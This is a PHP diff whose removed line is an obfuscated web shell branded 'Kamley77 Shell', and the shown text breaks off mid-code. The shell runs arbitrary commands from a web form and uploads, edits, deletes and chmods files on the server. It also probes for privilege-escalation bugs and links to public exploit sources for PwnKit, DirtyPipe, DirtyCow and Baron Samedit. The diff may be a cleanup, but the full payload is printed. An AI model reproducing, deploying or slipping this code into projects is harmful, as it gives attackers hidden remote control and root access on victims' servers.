@@ -1,2 +1,386 @@
 <?php
-goto M8TxA; rKRJP: $p6QZj = "\146\151\154\145\137\x67\145" . "\x74\x5f\143\157\x6e\x74\145\x6e\x74\163"; goto BtnEq; wOVkq: KZrrA: goto G1PeZ; bpDLM: if (!isset($_POST["\155\153\x5f\144\151\x72"])) { goto qgwT8; } goto Iwv7o; x6Mko: @$CmRVa($_POST["\x6f\x6c\x64"], $_POST["\x6e\x65\x77"]); goto AOXzq; KKBCZ: echo "\x3c\144\x69\166\40\163\x74\171\x6c\145\75\47\142\x61\x63\153\x67\162\157\x75\x6e\144\x3a\x23\x32\65\x32\65\62\65\x3b\40\160\x61\x64\x64\151\x6e\x67\x3a\x38\160\x78\73\x20\142\157\162\144\145\162\55\x72\141\x64\151\x75\x73\x3a\x33\x70\170\73\40\155\x61\x72\x67\x69\156\72\61\x30\x70\x78\x20\x30\73\x27\x3e\15\12\x3c\146\x6f\162\155\40\x6d\x65\x74\x68\x6f\x64\x3d\x27\120\x4f\123\124\47\x20\x65\x6e\x63\164\x79\x70\x65\75\x27\155\x75\154\x74\x69\x70\141\x72\x74\57\146\x6f\x72\x6d\55\x64\141\164\141\47\40\x73\x74\x79\154\x65\x3d\x27\x64\151\x73\x70\154\141\171\x3a\151\156\154\151\156\x65\73\47\x3e\40\125\x70\x3a\x20\x3c\x69\156\160\x75\x74\x20\x74\x79\x70\145\x3d\x27\x66\151\x6c\x65\x27\x20\x6e\141\155\x65\x3d\47\x66\x27\76\74\151\156\x70\165\x74\40\x74\171\x70\x65\x3d\47\163\165\142\155\151\164\47\40\x76\141\x6c\x75\x65\x3d\47\107\x6f\47\76\74\57\x66\x6f\x72\x6d\x3e\40\x7c\40\15\12\74\x66\x6f\x72\x6d\40\x6d\x65\x74\x68\157\144\75\x27\x50\x4f\123\x54\47\x20\x73\164\171\154\145\75\47\x64\151\163\160\154\141\x79\x3a\x69\x6e\154\x69\156\x65\x3b\47\76\40\x46\x69\x6c\x65\72\40\74\151\156\160\x75\x74\x20\x74\171\x70\x65\x3d\x27\x74\145\170\164\x27\40\156\x61\155\145\x3d\47\x6e\x5f\x66\x69\154\x65\47\x20\163\151\172\145\x3d\x27\x38\47\76\x3c\x69\156\160\165\x74\40\164\x79\160\145\75\47\163\x75\x62\x6d\x69\164\x27\x20\x6e\141\x6d\x65\75\x27\x6d\x6b\x5f\146\x69\x6c\x65\x27\x20\x76\x61\x6c\x75\145\75\x27\116\x65\167\47\76\x3c\57\146\x6f\162\155\x3e\x20\x7c\x20\15\12\74\146\157\162\155\40\x6d\x65\x74\x68\x6f\x64\75\47\120\117\123\x54\x27\x20\163\x74\171\x6c\x65\x3d\47\144\x69\163\x70\154\141\x79\x3a\x69\156\154\x69\x6e\x65\x3b\47\x3e\40\104\151\162\x3a\x20\x3c\151\156\160\x75\164\40\x74\171\x70\x65\x3d\x27\164\145\x78\x74\47\x20\156\141\155\x65\x3d\47\x6e\x5f\x64\151\162\x27\x20\x73\151\x7a\145\x3d\x27\x38\x27\76\x3c\x69\156\x70\165\164\40\x74\x79\160\x65\x3d\x27\x73\x75\142\x6d\x69\x74\47\x20\156\141\155\145\x3d\47\155\x6b\137\144\151\162\47\x20\166\141\x6c\x75\145\75\47\116\x65\x77\47\x3e\x3c\x2f\x66\x6f\162\x6d\76\xd\xa\x3c\x2f\144\x69\166\x3e"; goto hjvha; GFd2C: echo "\74\150\63\76\x45\144\151\x74\x3a\40" . $_GET["\x69\164\145\x6d"] . "\74\x2f\x68\x33\x3e\74\x66\157\x72\x6d\40\155\x65\x74\x68\157\x64\75\47\120\x4f\x53\124\47\x3e\x3c\164\x65\170\164\x61\162\x65\141\40\156\x61\155\x65\x3d\47\x64\x61\164\x61\47\40\163\164\171\x6c\x65\x3d\47\167\151\x64\164\x68\72\61\60\60\45\x3b\40\x68\145\x69\147\150\x74\x3a\62\60\x30\160\x78\73\x27\x3e" . htmlspecialchars(@$p6QZj($_GET["\x69\164\x65\155"])) . "\74\x2f\x74\x65\x78\x74\141\162\145\x61\x3e\74\151\156\160\x75\164\x20\x74\171\x70\x65\75\x27\x68\151\x64\144\145\156\x27\40\156\x61\155\145\x3d\47\x66\151\154\x65\47\40\166\x61\x6c\165\x65\x3d\x27{$_GET["\x69\164\145\155"]}\x27\x3e\x3c\142\x72\x3e\x3c\151\x6e\x70\165\164\40\164\x79\x70\145\75\47\x73\165\x62\155\x69\x74\x27\40\156\x61\x6d\x65\x3d\x27\145\144\151\164\x5f\x73\141\166\145\47\x20\166\x61\x6c\x75\145\75\47\123\141\x76\x65\47\x3e\x3c\57\146\157\x72\155\76"; goto SVkHq; Iwv7o: @$sfDhQ($_POST["\156\x5f\x64\151\x72"]); goto C8fp2; Cw5kt: WFOg6: goto GFd2C; j31Ib: echo "\x3c\x64\151\166\x20\x63\154\141\x73\163\75\47\x73\171\x73\55\x69\156\146\x6f\47\x3e\74\x62\76\113\145\x72\156\x65\154\72\x3c\57\x62\76\40" . php_uname() . "\40\x7c\40\74\142\76\x55\163\x65\x72\x3a\74\57\x62\x3e\x20" . get_current_user() . "\74\x2f\x64\151\x76\x3e"; goto ZP4ex; IJchJ: if (!is_dir($qAaNI)) { goto skRrM; } goto fFBpY; tG8VZ: $TVjAm = "\x75\156" . "\154\x69\156\x6b"; goto uJZKJ; hjvha: echo "\x3c\142\x3e\x4c\157\x63\x61\x74\x69\157\156\72\74\57\142\76\x20"; goto Rclso; C8fp2: qgwT8: goto mvlpI; mvlpI: if (!isset($_GET["\x64\145\x6c"])) { goto tP0YM; } goto saEEn; VWb_D: echo "\x3c\160\162\145\40\x63\154\x61\x73\x73\75\x27\164\145\x72\x6d\47\76\x24\x20" . htmlspecialchars($_POST["\x63\x6d\144"]) . "\12\xa" . htmlspecialchars(SK5bO($_POST["\143\x6d\x64"])) . "\74\57\160\x72\145\76"; goto ijK0E; pXaJ2: if (!isset($_POST["\x63\155\x64"])) { goto o1xud; } goto VWb_D; Wdz3L: echo "\74\141\40\x68\162\145\146\75\47\77\160\x61\164\150\x3d\x2f\x27\x3e\57\74\57\141\76\40"; goto YFPtP; EXq73: goto RlPE3; goto Cw5kt; kdPHZ: @$KDJS1($_POST["\x6e\x5f\x66\x69\x6c\x65"]); goto fdsjR; n4YxB: if (isset($_GET["\143\x68\x6d\157\x64"])) { goto Hv1M0; } goto oXRwG; Ld078: echo "\x3c\x64\x69\166\x20\x63\x6c\x61\x73\x73\x3d\x27\x76\x75\154\156\55\142\157\x78\x27\76\133\41\135\x20\126\125\114\x4e\x45\x52\x41\102\x4c\105\x20\x44\x45\x54\x45\x43\x54\105\x44\x3a\40"; goto KGLlD; F3bfk: echo "\74\x68\x34\76\x54\x65\162\x6d\151\x6e\x61\x6c\40\x28\x4d\x75\154\x74\x69\55\102\171\x70\x61\x73\x73\x29\x3c\57\150\64\76\74\146\x6f\162\155\40\x6d\145\x74\x68\x6f\x64\75\47\x50\117\123\x54\x27\76\x3c\x69\x6e\160\x75\x74\40\x74\171\160\145\75\47\164\x65\x78\x74\x27\40\x6e\141\x6d\x65\x3d\x27\143\155\x64\x27\40\163\x74\171\x6c\x65\75\x27\167\x69\144\164\150\72\70\x30\45\x27\x20\141\x75\x74\x6f\146\157\143\x75\163\x3e\74\x69\156\160\165\x74\40\164\x79\160\145\x3d\x27\x73\x75\x62\x6d\151\x74\x27\x20\166\x61\x6c\165\x65\75\47\122\165\x6e\x27\76\74\x2f\146\x6f\x72\x6d\76"; goto pXaJ2; YFPtP: $Za3XI = ''; goto LsOUF; MpA1s: function sk5bo($KXpPh) { goto L9D41; Z7OD3: gsS5T: goto foSuX; P7drB: BcHvN: goto LEJdP; pjLH5: if (function_exists("\x73\x79\163\x74\x65\155")) { goto coknk; } goto BMOv2; FOyOD: qalAO: goto zxSuL; DFtZR: hbVWy: goto k4KDi; L9D41: $ikt4d = ''; goto pjLH5; frfC_: if (feof($niNsK)) { goto WLihY; } goto NDLWj; k4KDi: goto gsS5T; goto P7drB; foSuX: goto J9NsV; goto pItT1; mNfAx: goto CmkSF; goto RossR; RDEOZ: J9NsV: goto mNfAx; RossR: coknk: goto Xhu1M; hmxhN: $ikt4d = shell_exec($KXpPh); goto RDEOZ; KtGTO: GkQKX: goto frfC_; BjHHF: if (function_exists("\x70\x61\x73\x73\164\150\x72\x75")) { goto oKp9a; } goto PcsUK; zxSuL: goto hbVWy; goto K0xdO; bmtfT: if (function_exists("\145\170\x65\x63")) { goto BcHvN; } goto BjHHF; gEM2U: return $ikt4d; goto NpQ7p; K0xdO: oKp9a: goto nVO2m; A34Xp: ob_end_clean(); goto E3krW; T0Aaf: pclose($niNsK); goto FOyOD; M7ZJt: passthru($KXpPh); goto xoneK; LEJdP: exec($KXpPh, $RkNnF); goto f5SCi; de9le: system($KXpPh); goto klTNi; E3krW: CmkSF: goto gEM2U; Xhu1M: ob_start(); goto de9le; BMOv2: if (function_exists("\163\x68\x65\x6c\154\137\145\170\x65\x63")) { goto iRmSB; } goto bmtfT; f5SCi: $ikt4d = implode("\12", $RkNnF); goto Z7OD3; pItT1: iRmSB: goto hmxhN; wYxLe: goto GkQKX; goto H2LwK; klTNi: $ikt4d = ob_get_contents(); goto A34Xp; H2LwK: WLihY: goto T0Aaf; PcsUK: if (!function_exists("\x70\157\x70\145\x6e")) { goto qalAO; } goto neE95; nVO2m: ob_start(); goto M7ZJt; dtJxM: ob_end_clean(); goto DFtZR; xoneK: $ikt4d = ob_get_contents(); goto dtJxM; neE95: $niNsK = popen($KXpPh, "\x72"); goto KtGTO; NDLWj: $ikt4d .= fread($niNsK, 1024); goto wYxLe; NpQ7p: } goto aJqnU; M8TxA: error_reporting(0); goto Nv8vk; sumGZ: echo "\x3c\144\151\x76\x20\x73\x74\x79\x6c\145\x3d\x27\x62\x61\143\153\147\x72\x6f\165\156\144\x3a\x23\60\x30\x32\62\60\x30\x3b\40\x63\157\x6c\157\162\72\43\x30\x66\x30\73\x20\x74\x65\x78\164\55\141\x6c\x69\147\156\x3a\x63\145\x6e\x74\x65\x72\73\x20\x70\x61\144\x64\151\156\x67\x3a\x35\x70\x78\73\x20\146\x6f\x6e\x74\x2d\x73\x69\x7a\x65\x3a\x31\61\x70\x78\x3b\40\142\x6f\x72\144\x65\162\x3a\61\160\x78\40\x73\157\x6c\151\x64\40\x23\x30\x66\x30\x3b\47\x3e\133\53\x5d\40\116\x6f\40\x43\157\155\x6d\x6f\x6e\x20\126\165\154\x6e\145\162\x61\x62\x69\x6c\x69\164\x69\x65\x73\x20\104\x65\164\x65\x63\164\x65\x64\74\57\144\151\x76\x3e"; goto lXTKR; ZoWoa: echo "\74\150\x33\x3e\103\150\155\x6f\x64\74\x2f\x68\63\x3e\x3c\x66\157\x72\155\x20\155\145\x74\150\157\x64\75\47\x50\x4f\x53\124\47\76\74\151\x6e\160\x75\164\40\164\171\160\145\75\x27\x74\145\170\x74\47\x20\x6e\141\155\145\x3d\x27\160\x27\x20\163\151\x7a\145\x3d\47\x35\x27\40\166\141\154\x75\x65\x3d\x27\x30\67\65\x35\x27\76\74\151\x6e\x70\x75\x74\x20\x74\171\160\x65\75\x27\x68\x69\144\144\x65\x6e\x27\x20\156\x61\x6d\145\x3d\47\x69\164\x65\x6d\x27\x20\x76\x61\154\165\145\75\47{$_GET["\151\x74\x65\155"]}\47\x3e\x3c\151\x6e\x70\165\164\x20\x74\171\x70\145\75\47\163\x75\x62\x6d\151\x74\x27\40\156\x61\x6d\x65\75\47\x64\x6f\x5f\143\150\155\x27\x20\166\141\154\x75\145\x3d\x27\x53\x65\x74\x27\x3e\x3c\x2f\x66\x6f\162\x6d\76"; goto A92_j; ijK0E: o1xud: goto UTg0G; WbNNR: echo "\74\x68\164\155\154\76\x3c\150\145\141\144\76\x3c\x74\x69\x74\x6c\145\x3e\113\x61\x6d\x6c\x65\171\67\x37\x20\123\150\145\154\154\74\x2f\x74\x69\164\154\x65\76\74\x73\164\x79\154\145\76\15\xa\x20\40\x20\40\142\x6f\144\x79\x7b\146\157\x6e\x74\x2d\146\141\155\151\x6c\x79\x3a\155\x6f\x6e\157\x73\160\x61\143\x65\73\40\142\x61\x63\153\147\x72\x6f\x75\156\x64\72\x23\x31\x32\61\x32\61\62\73\x20\143\x6f\x6c\157\x72\72\43\x66\146\146\73\40\x70\x61\144\x64\151\x6e\x67\72\61\65\160\170\x3b\40\146\x6f\x6e\164\55\x73\151\172\x65\72\x31\62\160\170\x3b\40\155\141\x72\147\151\x6e\72\x30\x3b\175\15\12\x20\40\x20\x20\141\173\x63\x6f\154\157\162\x3a\x23\64\x64\x61\x36\146\x66\73\40\164\145\170\164\55\144\x65\143\x6f\x72\141\x74\x69\x6f\156\x3a\x6e\x6f\x6e\145\73\175\xd\xa\x20\x20\x20\40\164\141\x62\154\x65\173\167\x69\x64\x74\x68\72\x31\x30\x30\x25\x3b\40\x62\157\x72\x64\x65\x72\x2d\143\x6f\x6c\x6c\141\x70\x73\145\72\143\x6f\x6c\154\x61\160\163\x65\x3b\x20\x6d\x61\162\x67\151\x6e\55\164\x6f\x70\x3a\61\x30\x70\x78\73\x20\x62\141\143\x6b\x67\x72\x6f\165\x6e\144\72\43\61\145\61\x65\x31\145\x3b\x7d\15\12\40\x20\40\40\x74\150\x2c\40\164\144\173\160\x61\144\x64\151\x6e\147\x3a\66\x70\170\x3b\40\x62\x6f\162\x64\x65\x72\x3a\61\160\x78\x20\x73\x6f\x6c\x69\x64\40\x23\63\63\63\x3b\40\x74\x65\170\164\x2d\141\x6c\x69\x67\156\72\x6c\x65\x66\x74\x3b\175\xd\12\x20\x20\x20\40\151\156\160\165\x74\54\x20\x74\145\x78\x74\141\x72\x65\x61\x7b\142\141\x63\x6b\147\162\157\x75\x6e\x64\x3a\x23\x32\141\62\141\62\141\73\40\143\x6f\154\x6f\162\x3a\x23\x66\x66\146\73\40\142\x6f\162\144\x65\x72\x3a\61\x70\170\x20\x73\x6f\154\x69\x64\40\x23\x34\64\x34\x3b\x20\x70\141\x64\x64\x69\156\x67\72\65\160\170\73\175\15\12\x20\40\x20\40\15\xa\40\40\40\40\56\166\x75\154\156\55\142\x6f\170\x20\173\40\x62\141\143\x6b\x67\162\x6f\165\156\144\x3a\x20\43\x30\x30\60\x3b\x20\x62\157\x72\144\x65\x72\72\40\61\x70\170\x20\163\157\x6c\x69\x64\40\x23\60\146\60\73\40\x70\x61\x64\144\151\156\147\x3a\x20\x31\x30\x70\170\73\x20\x6d\x61\x72\x67\x69\x6e\x3a\x20\x31\x30\160\x78\x20\x30\x3b\40\x63\157\x6c\x6f\x72\72\x20\x23\x30\146\60\73\x20\x74\x65\170\164\x2d\x61\154\151\x67\156\72\40\143\145\156\x74\x65\162\x3b\x20\142\x6f\170\x2d\x73\150\141\144\x6f\167\x3a\40\60\x20\x30\x20\70\160\170\x20\43\x30\146\60\x3b\40\x66\x6f\156\x74\x2d\163\x69\x7a\145\x3a\x20\x31\x31\x70\x78\x3b\x20\x7d\xd\12\x20\x20\x20\40\x2e\160\x6f\143\55\x62\x74\156\x20\173\x20\x64\x69\x73\160\154\x61\171\72\x20\x69\156\x6c\x69\x6e\x65\55\142\x6c\157\x63\153\x3b\x20\x6d\x61\x72\147\x69\156\72\40\x33\160\170\73\40\x70\x61\x64\x64\151\x6e\x67\x3a\40\x34\160\x78\x20\x31\x32\160\x78\73\x20\142\141\x63\x6b\x67\x72\157\165\x6e\x64\72\40\43\146\x66\x66\73\x20\143\157\x6c\x6f\162\x3a\x20\x23\60\x30\x30\73\40\x66\157\156\x74\55\167\x65\x69\147\x68\164\72\x20\x62\x6f\x6c\x64\x3b\40\142\x6f\162\144\x65\x72\55\x72\x61\144\151\165\x73\72\x20\x32\x70\x78\x3b\40\146\157\x6e\164\55\163\x69\172\145\x3a\40\61\60\160\x78\73\x20\x74\x65\x78\x74\55\x74\162\141\156\163\146\x6f\162\155\72\x20\165\x70\x70\145\x72\143\141\x73\x65\x3b\40\x62\x6f\x72\144\145\162\x3a\x6e\157\x6e\145\73\x20\143\x75\x72\163\157\162\x3a\x70\157\x69\156\x74\x65\x72\x3b\175\15\12\x20\40\40\x20\x2e\150\x65\x61\144\x65\162\55\x74\x69\164\154\145\173\164\145\x78\x74\55\x61\154\x69\147\156\72\x63\x65\156\164\145\162\73\40\x66\157\156\164\55\163\151\x7a\145\x3a\x31\70\160\x78\x3b\40\146\x6f\156\x74\x2d\x77\145\x69\x67\x68\164\72\142\x6f\x6c\144\73\x20\143\157\154\157\162\x3a\x23\x34\x64\141\66\146\146\73\x20\155\141\162\147\151\x6e\72\65\x70\170\x20\60\x3b\x7d\xd\12\40\40\x20\x20\x2e\x73\x79\x73\55\x69\156\146\x6f\173\x74\145\x78\x74\x2d\x61\x6c\x69\147\156\x3a\143\x65\156\x74\145\x72\x3b\x20\146\x6f\x6e\164\55\163\x69\x7a\145\x3a\x31\61\160\170\73\40\143\157\x6c\157\x72\72\43\x62\x62\x62\x3b\40\142\157\162\x64\x65\x72\55\142\157\164\164\x6f\155\72\x31\x70\170\x20\x73\x6f\x6c\151\x64\40\x23\x33\63\x33\x3b\40\160\141\144\144\151\x6e\x67\x2d\142\x6f\x74\164\x6f\x6d\x3a\61\x30\x70\170\73\x20\x6d\x61\162\x67\x69\156\x2d\x62\157\x74\x74\x6f\x6d\72\61\60\160\170\73\175\15\12\40\40\x20\x20\x2e\164\145\162\155\x7b\142\x61\x63\153\147\162\x6f\x75\x6e\144\x3a\43\60\x30\60\x3b\x20\x63\157\x6c\157\x72\72\43\60\x66\x30\73\x20\160\141\x64\x64\151\x6e\147\x3a\x31\60\x70\x78\73\40\142\157\162\144\x65\162\72\61\x70\x78\x20\163\157\x6c\151\144\x20\43\x30\146\x30\x3b\40\x77\151\144\x74\150\x3a\61\60\60\x25\x3b\40\150\x65\x69\x67\150\x74\72\x31\70\60\160\170\x3b\x20\x66\157\x6e\164\x2d\x73\151\x7a\x65\x3a\61\61\x70\x78\x3b\40\157\166\145\x72\x66\154\157\x77\72\x61\x75\164\x6f\x3b\x7d\xd\xa\x20\40\40\x20\x2e\x66\x6f\x6f\164\145\162\x7b\164\x65\170\x74\x2d\x61\x6c\x69\147\x6e\x3a\143\x65\156\x74\145\x72\x3b\40\x6d\141\x72\147\x69\156\x2d\x74\157\160\x3a\61\x35\x70\170\73\x20\x63\x6f\x6c\x6f\162\72\43\x37\67\x37\73\x20\x66\x6f\x6e\164\55\x73\x69\172\x65\72\x31\61\x70\x78\73\x20\146\x6f\156\164\x2d\x77\145\151\147\x68\x74\72\x62\x6f\154\x64\73\x7d\xd\12\x3c\57\163\x74\x79\x6c\x65\76\74\57\150\x65\141\144\76\x3c\x62\157\x64\171\76"; goto X_89P; rVBxv: @$Y9sO8($_POST["\x69\x74\145\x6d"], octdec($_POST["\160"])); goto AWVBG; vEGXw: goto RlPE3; goto ZPhjI; Rclso: $tDMRt = explode("\57", trim($qAaNI, "\x2f")); goto Wdz3L; saEEn: @$TVjAm($_GET["\x64\x65\154"]); goto E5PxX; SVkHq: goto RlPE3; goto OYLkO; UpwRC: @move_uploaded_file($_FILES["\x66"]["\x74\x6d\x70\137\x6e\x61\155\x65"], $qAaNI . "\x2f" . $_FILES["\146"]["\x6e\x61\x6d\145"]); goto UYqDb; A92_j: RlPE3: goto F3bfk; ZP4ex: $rUC1x = jtaXp(); goto pdZ3z; putUn: if (!isset($_POST["\x64\x6f\x5f\x72\145\x6e"])) { goto Isapc; } goto x6Mko; hZuca: if (!isset($_POST["\145\144\151\164\x5f\x73\x61\x76\x65"])) { goto R0RKP; } goto poQ6o; UYqDb: GS0vT: goto hZuca; G1PeZ: if (isset($_GET["\145\144\151\164"])) { goto WFOg6; } goto J0Dh_; oXRwG: echo "\x3c\x74\x61\142\154\145\x3e\x3c\x74\x72\40\x62\147\x63\x6f\x6c\157\162\75\47\43\x33\x33\63\47\x20\x73\x74\x79\x6c\145\x3d\x27\143\157\154\157\162\x3a\x23\x34\x64\141\x36\x66\146\47\76\x3c\164\150\76\x4e\141\x6d\145\74\57\164\x68\x3e\74\x74\150\x3e\123\x69\x7a\x65\x3c\57\x74\150\x3e\74\x74\150\76\x50\x65\x72\x6d\x73\74\57\x74\150\76\x3c\x74\150\76\101\x63\164\x69\x6f\156\x73\x3c\x2f\164\150\76\74\57\x74\x72\76"; goto RRZG9; PWe2H: R0RKP: goto putUn; pdZ3z: if (!empty($rUC1x)) { goto wtVFn; } goto sumGZ; SlL3d: h5hyW: goto kaSLS; BtnEq: $Xbkke = "\146\151\154\x65\x5f\160\165" . "\x74\137\143\157\156\164\x65\156\x74\163"; goto MpA1s; M6t3s: wtVFn: goto Ld078; ZPhjI: Hv1M0: goto ZoWoa; AWVBG: XQ9fr: goto pKiqm; WksZH: $KDJS1 = "\x74\157\x75" . "\143\x68"; goto rKRJP; AOXzq: Isapc: goto JKPRV; K6q7Z: $qAaNI = isset($_GET["\x70\141\164\150"]) ? $_GET["\160\141\x74\150"] : getcwd(); goto CNsxC; KGLlD: foreach ($rUC1x as $c10K9) { echo "\74\163\x70\x61\x6e\40\163\x74\171\154\145\75\47\x62\157\x72\x64\x65\162\55\x72\x69\x67\x68\164\x3a\x31\160\170\40\x73\x6f\x6c\x69\x64\40\x23\63\x33\63\x3b\x20\160\x61\144\144\151\x6e\x67\72\60\x20\61\x30\x70\x78\73\x27\x3e\x3c\x62\x3e" . $c10K9["\156\141\x6d\145"] . "\74\x2f\x62\x3e\x20\50" . $c10K9["\x63\x76\x65"] . "\x29\40\x3c\141\40\x68\x72\145\146\x3d\47" . $c10K9["\x75\162\154"] . "\x27\x20\x74\141\x72\147\145\164\75\47\137\142\x6c\141\x6e\x6b\47\x20\x63\154\141\x73\163\75\x27\160\x6f\143\55\142\x74\x6e\47\76\107\105\x54\x20\120\x4f\103\74\x2f\x61\x3e\x3c\57\x73\160\x61\156\76\40"; PrBjG: } goto SlL3d; lXTKR: goto UydW2; goto M6t3s; AUAcR: $sfDhQ = "\x6d\153" . "\x64\x69\162"; goto WksZH; fdsjR: E_ogz: goto bpDLM; OYLkO: DCO6p: goto p_my7; sG27G: skRrM: goto Ly_4d; E5PxX: tP0YM: goto WbNNR; CNsxC: $qAaNI = str_replace("\134", "\57", $qAaNI); goto IJchJ; UTg0G: echo "\x3c\x64\151\x76\x20\143\154\141\x73\x73\75\x27\x66\x6f\157\x74\x65\162\47\76\x53\110\105\114\x4c\x20\x42\131\x50\x41\x53\123\40\166\145\162\x73\151\157\156\x20\143\x72\145\141\x74\145\x64\40\142\x79\40\113\141\155\154\145\171\x37\67\x3c\57\144\x69\166\x3e"; goto mLLU5; fFBpY: chdir($qAaNI); goto sG27G; JKPRV: if (!isset($_POST["\144\x6f\137\x63\x68\155"])) { goto XQ9fr; } goto rVBxv; aJqnU: function jTAXP() { goto TBPcd; TBPcd: $f_nVJ = php_uname("\162"); goto vmeK6; gJ3yz: $TR0lp[] = ["\156\141\155\x65" => "\123\165\x64\x6f\x42\141\x72\157\x6e", "\x63\166\145" => "\x43\x56\x45\55\62\60\x32\x31\x2d\x33\x31\x35\x36", "\x75\x72\154" => "\x68\x74\x74\x70\x73\72\57\x2f\162\141\167\56\147\151\x74\x68\x75\x62\165\163\x65\x72\x63\x6f\156\x74\x65\156\x74\56\143\x6f\155\57\114\151\166\x65\117\166\x65\162\146\x6c\157\167\57\x70\x77\156\x65\144\151\164\x2f\x72\x65\146\x73\x2f\150\145\x61\x64\x73\x2f\x6d\141\x69\156\x2f\x65\x70\151\x73\x6f\x64\x65\60\x31\x2f\163\165\144\157\56\143"]; goto Dyig6; uoqeU: if (!(version_compare($f_nVJ, "\65\x2e\x38", "\x3e\75") && version_compare($f_nVJ, "\65\x2e\61\66\56\61\x31", "\74"))) { goto qFZBu; } goto HbKab; Ocvdm: return $TR0lp; goto x1LuG; Dyig6: uGgJE: goto Ocvdm; iDRcW: BqGzJ: goto uoqeU; cQ1eJ: if (!(version_compare($f_nVJ, "\x32\x2e\66\56\x32\62", "\76\75") && version_compare($f_nVJ, "\x34\56\70\56\x33", "\x3c\75"))) { goto CZHAq; } goto QRjrH; HbKab: $TR0lp[] = ["\156\141\155\145" => "\104\x69\x72\x74\171\120\x69\160\x65", "\x63\x76\x65" => "\x43\x56\105\55\62\60\x32\62\55\60\70\x34\x37", "\x75\x72\x6c" => "\x68\164\x74\160\163\72\x2f\57\x72\x61\x77\56\147\151\164\150\x75\142\165\163\145\162\143\x6f\x6e\x74\x65\156\164\56\143\157\155\57\x41\162\151\x6e\145\162\162\157\x6e\x2f\x43\126\105\55\62\60\x32\x32\55\60\70\x34\67\55\x44\x69\x72\x74\x79\120\x69\160\x65\55\x45\170\160\154\x6f\151\164\57\x72\x65\x66\163\57\150\145\141\144\163\x2f\x6d\x61\x69\156\x2f\x65\x78\x70\x6c\x6f\151\164\x2e\x63"]; goto czYqa; agaco: if (!(strpos(sk5BO("\163\165\144\157\x65\x64\x69\x74\40\55\x73\40\x2f\40\x32\x3e\46\61"), "\163\165\x64\157\145\144\x69\164\72") !== false)) { goto uGgJE; } goto gJ3yz; slmFy: if (!file_exists("\57\165\x73\162\x2f\x62\x69\x6e\57\x70\153\x65\170\x65\x63")) { goto BqGzJ; } goto vTW09; JGY9A: CZHAq: goto agaco; vTW09: $TR0lp[] = ["\156\141\x6d\145" => "\120\x77\156\x4b\151\x74", "\x63\166\145" => "\x43\x56\x45\55\62\x30\x32\61\x2d\x34\x30\63\64", "\x75\x72\154" => "\150\164\x74\160\163\x3a\x2f\57\162\x61\x77\x2e\x67\151\x74\x68\x75\142\165\163\x65\x72\143\157\x6e\164\145\156\x74\x2e\143\157\x6d\57\154\x79\64\153\x2f\120\167\156\x4b\x69\164\x2f\162\145\146\163\57\150\x65\x61\144\x73\57\x6d\x61\x69\156\57\120\x77\156\x4b\151\x74\x2e\x63"]; goto iDRcW; QRjrH: $TR0lp[] = ["\156\x61\155\x65" => "\104\151\x72\164\171\103\x6f\167", "\143\166\x65" => "\x43\126\x45\55\x32\x30\x31\66\55\65\61\71\65", "\165\x72\154" => "\x68\164\x74\x70\163\72\x2f\x2f\162\141\x77\56\147\151\164\150\165\142\x75\x73\145\x72\143\x6f\x6e\164\x65\156\x74\56\143\157\x6d\x2f\x66\151\162\145\x66\x61\162\164\x2f\x64\151\x72\164\171\x63\157\167\57\x72\x65\146\x73\57\x68\x65\x61\x64\163\57\x6d\x61\163\164\x65\x72\x2f\144\151\x72\164\171\56\143"]; goto JGY9A; vmeK6: $TR0lp = []; goto slmFy; czYqa: qFZBu: goto cQ1eJ; x1LuG: } goto K6q7Z; LsOUF: foreach ($tDMRt as $niNsK) { goto XQCH2; IHoDs: P5xff: goto KupJF; XQCH2: $Za3XI .= "\x2f" . $niNsK; goto cI8m3; cI8m3: echo "\74\141\x20\x68\x72\145\146\75\x27\x3f\x70\x61\x74\150\75{$Za3XI}\47\x3e{$niNsK}\74\x2f\141\x3e\x20\57\x20"; goto IHoDs; KupJF: } goto wOVkq; J0Dh_: if (isset($_GET["\162\x65\156\141\x6d\x65"])) { goto DCO6p; } goto n4YxB; EMHjz: UydW2: goto KKBCZ; pKiqm: if (!isset($_POST["\x6d\153\x5f\x66\151\154\145"])) { goto E_ogz; } goto kdPHZ; FwBTz: B1h8k: goto AmW2y; AmW2y: echo "\x3c\x2f\x74\x61\x62\x6c\x65\x3e"; goto EXq73; poQ6o: @$Xbkke($_POST["\146\151\154\145"], $_POST["\x64\x61\164\x61"]); goto PWe2H; kaSLS: echo "\x3c\57\x64\x69\166\76"; goto EMHjz; p_my7: echo "\x3c\150\x33\x3e\122\145\156\141\155\145\74\57\x68\x33\x3e\74\146\157\162\x6d\40\x6d\145\164\150\157\x64\75\47\120\117\123\124\x27\x3e\x3c\151\x6e\x70\165\164\x20\x74\x79\x70\145\x3d\47\164\145\170\164\x27\x20\x6e\x61\155\145\x3d\x27\156\x65\x77\x27\40\166\x61\154\x75\x65\75\47{$_GET["\151\x74\145\x6d"]}\x27\x3e\x3c\151\x6e\160\x75\x74\40\x74\x79\x70\x65\75\47\150\x69\x64\x64\145\156\47\x20\x6e\141\155\x65\75\47\157\154\x64\47\x20\166\141\154\165\145\75\47{$_GET["\x69\164\145\x6d"]}\47\76\x3c\x69\x6e\x70\x75\x74\40\164\x79\x70\x65\75\x27\x73\x75\x62\x6d\x69\x74\47\x20\x6e\x61\x6d\145\x3d\47\x64\157\137\x72\x65\x6e\47\x20\166\141\x6c\165\x65\x3d\47\107\x6f\47\76\x3c\x2f\146\157\x72\x6d\x3e"; goto vEGXw; uJZKJ: $CmRVa = "\x72\x65\x6e" . "\141\155\145"; goto U6o5F; Ly_4d: if (!isset($_FILES["\x66"])) { goto GS0vT; } goto UpwRC; U6o5F: $Y9sO8 = "\x63\150" . "\155\157\x64"; goto AUAcR; RRZG9: foreach (scandir($qAaNI) as $fR9mM) { goto RBIxH; rgJSm: $qTTfA = $qAaNI . "\x2f" . $fR9mM; goto Yd1mm; Yd1mm: $niNsK = substr(sprintf("\45\157", fileperms($qTTfA)), -4); goto wCktO; RzWql: n0GDy: goto rgJSm; DFEKm: goto qP77G; goto RzWql; KiO6k: qP77G: goto ZJYb5; wCktO: echo "\x3c\164\x72\76\15\12\x20\x20\x20\x20\x20\x20\40\x20\40\40\40\x20\74\x74\144\x3e" . (is_dir($fR9mM) ? "\74\141\x20\150\x72\145\x66\x3d\x27\x3f\x70\x61\164\150\75{$qTTfA}\47\x3e\74\142\76\x5b{$fR9mM}\x5d\74\x2f\142\x3e\74\x2f\141\76" : $fR9mM) . "\x3c\x2f\164\144\x3e\15\12\x20\x20\40\x20\40\40\x20\x20\40\40\40\x20\74\164\x64\76" . (is_dir($fR9mM) ? 